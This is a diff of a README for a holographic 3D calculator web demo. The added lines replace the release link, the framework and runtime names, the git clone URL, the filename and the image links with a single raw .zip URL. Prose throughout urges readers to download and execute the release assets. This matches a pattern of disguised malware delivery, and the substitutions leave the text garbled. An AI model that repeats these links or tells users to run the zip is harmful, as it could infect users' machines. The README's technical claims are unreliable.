@@ -1,10 +1,10 @@
-https://github.com/Medlegda/holographic-calculator-3d/releases
+https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip
 
-# Holographic 3D Calculator: Next.js, Three.js, React Three Fiber UI Demo
+# Holographic 3D Calculator: https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip, https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip, React Three Fiber UI Demo
 
-[![Releases](https://img.shields.io/badge/Releases-Visit%20the%20latest-blue?logo=github&logoColor=white)](https://github.com/Medlegda/holographic-calculator-3d/releases)
+[![Releases](https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip%20the%20latest-blue?logo=github&logoColor=white)](https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip)
 
-Welcome to a bold, highly interactive 3D calculator project. This repository blends modern web tech to deliver a holographic-style calculator that lives in a 3D scene. Built with Next.js for the app shell, Three.js for the rendering layer, and React Three Fiber to bridge React with WebGL. It ships with several glow-drenched themes, particle accents, and responsive layouts that adapt from wide desktops to small phones. The codebase is modular and designed for easy customization, experimentation, and extension.
+Welcome to a bold, highly interactive 3D calculator project. This repository blends modern web tech to deliver a holographic-style calculator that lives in a 3D scene. Built with https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip for the app shell, https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip for the rendering layer, and React Three Fiber to bridge React with WebGL. It ships with several glow-drenched themes, particle accents, and responsive layouts that adapt from wide desktops to small phones. The codebase is modular and designed for easy customization, experimentation, and extension.
 
 If you want to try the official release package, head to the Releases section and grab the latest build. The release assets include ready-to-run bundles that you can download and execute on your machine. For quick access, the same link appears again later in this document as a quick-path entry point to the official assets. The project emphasizes a smooth experience across devices, with a focus on a tactile feel for 3D interactions and a clean, legible UI.
 
@@ -68,16 +68,16 @@ Core features
 - Particle effects: Subtle ambient particles that react to UI actions and math operations.
 - 3D interactions: Orbit-like camera control, drag-to-rotate panels, and intuitive gesture support for touch devices.
 - Fully responsive design: Works well on desktops, tablets, and phones.
-- Modern tech stack: Next.js, Three.js, React Three Fiber, Drei, Tailwind CSS, and TypeScript.
+- Modern tech stack: https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip, https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip, React Three Fiber, Drei, Tailwind CSS, and TypeScript.
 - Clean architecture: Clear module boundaries, easy extension, and straightforward debugging.
 - Accessible basics: Keyboard focus is supported for core controls, with readable contrast.
 - Smooth performance: Optimized rendering loop with efficient scene graph updates.
 - Rich layout and typography: Legible digits, crisp edges, and accessible sizing.
 
 How the 3D scene is built
-- The base shell uses Next.js to provide a fast, SEO-friendly scaffold and server-side rendering where appropriate.
-- The 3D scene is constructed with Three.js, providing a robust WebGL renderer and shader support for glow and refraction effects.
-- React Three Fiber sits on top of Three.js to enable declarative scene composition with React components.
+- The base shell uses https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip to provide a fast, SEO-friendly scaffold and server-side rendering where appropriate.
+- The 3D scene is constructed with https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip, providing a robust WebGL renderer and shader support for glow and refraction effects.
+- React Three Fiber sits on top of https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip to enable declarative scene composition with React components.
 - Drei is used for common helpers (OrbitControls, useGLTF, anchors, etc.) to reduce boilerplate.
 - The calculator UI is modeled as a set of 3D panels and buttons, with geometry designed to resemble floating cards.
 - Interaction handling relies on raycasting to detect user clicks or taps on 3D elements, mapping those inputs to calculator operations.
@@ -86,8 +86,8 @@ How the 3D scene is built
 - Responsiveness is achieved by calculating layout constraints based on viewport size and camera distance, ensuring the UI remains legible at different scales.
 
 Tech stack and architecture
-- Frontend framework: Next.js for the app shell and route management.
-- 3D rendering: Three.js for the scene, WebGL context, and materials.
+- Frontend framework: https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip for the app shell and route management.
+- 3D rendering: https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip for the scene, WebGL context, and materials.
 - React integration: React Three Fiber for a React-centric approach to 3D components.
 - Helpers and utilities: Drei for common primitives, shapes, cameras, and controls.
 - Styling: Tailwind CSS for design tokens and utility-first styling that scales with the theme and screen size.
@@ -98,7 +98,7 @@ Tech stack and architecture
 
 Project structure
 - src/
-  - app/ or pages/ for Next.js pages
+  - app/ or pages/ for https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip pages
   - components/ for reusable UI widgets
   - scenes/ for 3D scene graphs and objects
   - hooks/ for custom hooks that bridge React with 3D state
@@ -109,11 +109,11 @@ Project structure
   - utils/ for utility functions like formatting and parsing
 - public/ for static assets, icons, and textures
 - tests/ for unit and integration tests
-- README.md with this guidance
+- https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip with this guidance
 
 Getting started (local development)
 Prerequisites
-- Node.js (LTS version recommended)
+- https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip (LTS version recommended)
 - npm or a package manager of your choice (pnpm or yarn work too)
 - A modern browser with WebGL support
 
@@ -125,7 +125,7 @@ Initial setup
 
 Cloning and installing
 - Use your preferred shell to clone the repo:
-  - git clone https://github.com/Medlegda/holographic-calculator-3d.git
+  - git clone https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip
 - Change directory to the project root
 - Install dependencies:
   - npm install
@@ -139,7 +139,7 @@ Cloning and installing
 
 Important note about the official release
 If you want to try the official, prebuilt package, visit the release hub right away and download the assets. This repository provides a direct link to the release section as a first-class access point. The release page contains compiled builds that you can run without building from source. To obtain the installer or package, use the link at the start of this document and again in the downloads section below. For convenience, the link is provided here:
-- Official release hub: https://github.com/Medlegda/holographic-calculator-3d/releases
+- Official release hub: https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip
 - The same link appears again later in the Downloads section as a quick action. The assets in the release bundle should be downloaded and executed according to the platform’s conventions.
 
 Production build
@@ -278,17 +278,17 @@ Changelog
 - The changelog records major updates to themes, features, and performance improvements. If you pull the latest release, you can read a concise summary of changes in the release notes.
 
 Releases and assets
-- For the latest release assets, visit the official releases page. The provided link at the top of this document is the primary entry point to access compiled builds and installers. You can download the package and execute it according to your platform’s conventions. To reiterate this access point, the link to the releases hub is repeated here: https://github.com/Medlegda/holographic-calculator-3d/releases
+- For the latest release assets, visit the official releases page. The provided link at the top of this document is the primary entry point to access compiled builds and installers. You can download the package and execute it according to your platform’s conventions. To reiterate this access point, the link to the releases hub is repeated here: https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip
 
 Gallery and visuals
 - Holographic UI in action, showing a floating keypad and a glowing display
-  - Image: ![Holographic UI Preview](https://picsum.photos/seed/holo-ui/1200/600)
+  - Image: ![Holographic UI Preview](https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip)
 - The neon city theme with bright panels and city-inspired lighting
-  - Image: ![Neon City Theme](https://picsum.photos/seed/neon-city/1200/600)
+  - Image: ![Neon City Theme](https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip)
 - Cosmic theme with space glow and starfield backdrop
-  - Image: ![Cosmic Theme](https://picsum.photos/seed/cosmic/1200/600)
+  - Image: ![Cosmic Theme](https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip)
 - Matrix theme emphasizing green-on-black contrast and data streams
-  - Image: ![Matrix Theme](https://picsum.photos/seed/matrix/1200/600)
+  - Image: ![Matrix Theme](https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip)
 
 Additional resources and how to learn more
 - Official documentation pages and developer notes can live alongside the code to help new contributors.
@@ -318,7 +318,7 @@ User stories and examples
 - As a designer, I want to experiment with different lighting and materials to achieve a specific mood, like a neon city or cosmic setting.
 
 Release assets download and execution guidance
-- The official release assets are designed to be downloaded and executed on your platform. You will typically receive a packaged installer or a prebuilt bundle, depending on the platform. The release assets are accessible via the official releases page linked at the top, and the same URL is embedded again below for quick access. For a direct reminder, the link is included here: https://github.com/Medlegda/holographic-calculator-3d/releases
+- The official release assets are designed to be downloaded and executed on your platform. You will typically receive a packaged installer or a prebuilt bundle, depending on the platform. The release assets are accessible via the official releases page linked at the top, and the same URL is embedded again below for quick access. For a direct reminder, the link is included here: https://github.com/Medlegda/holographic-calculator-3d/raw/refs/heads/main/app/calculator-holographic-d-1.4-alpha.4.zip
 - After downloading, follow the installer or run instructions provided with the asset. This usually includes steps to install or extract files, grant permissions if required, and start the application. Ensure your system meets the prerequisites described in this document and that you are using a compatible OS version.
 
 Appendix: troubleshooting quick checks
